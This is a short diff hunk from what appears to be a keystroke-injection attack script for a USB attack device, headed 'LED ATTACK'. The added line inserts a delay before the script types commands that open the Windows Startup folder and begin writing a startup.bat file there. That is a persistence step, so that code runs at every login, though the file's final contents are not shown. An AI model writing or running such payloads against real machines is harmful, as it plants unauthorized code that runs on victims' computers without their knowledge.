@@ -16,6 +16,7 @@ LED ATTACK
 
 #Running cmd to create file in startup directory
 RUN WIN cmd
+Q DELAY 150
 Q STRING "cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 Q ENTER
 Q STRING "echo @echo off > startup.bat"
